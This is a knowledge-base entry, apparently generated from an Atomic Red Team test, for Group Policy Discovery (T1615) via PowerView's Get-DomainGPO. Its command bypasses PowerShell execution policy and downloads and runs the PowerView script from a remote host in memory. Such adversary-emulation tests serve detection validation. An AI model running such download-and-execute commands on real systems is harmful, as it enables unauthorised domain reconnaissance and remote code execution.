---
atomic_guid: "4e524c4e-0e02-49aa-8df5-93f3f7959b9f"
title: "Get-DomainGPO to display group policy information via PowerView"
framework: "atomic"
generated: "true"
attack_technique_id: "T1615"
attack_technique_name: "Group Policy Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1615/T1615.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "4e524c4e-0e02-49aa-8df5-93f3f7959b9f"
  - "Get-DomainGPO to display group policy information via PowerView"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Get-DomainGPO to display group policy information via PowerView

Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.

## Metadata

- Atomic GUID: 4e524c4e-0e02-49aa-8df5-93f3f7959b9f
- Technique: T1615: Group Policy Discovery
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1615/T1615.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1615-group_policy_discovery|T1615]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1615/T1615.yaml)
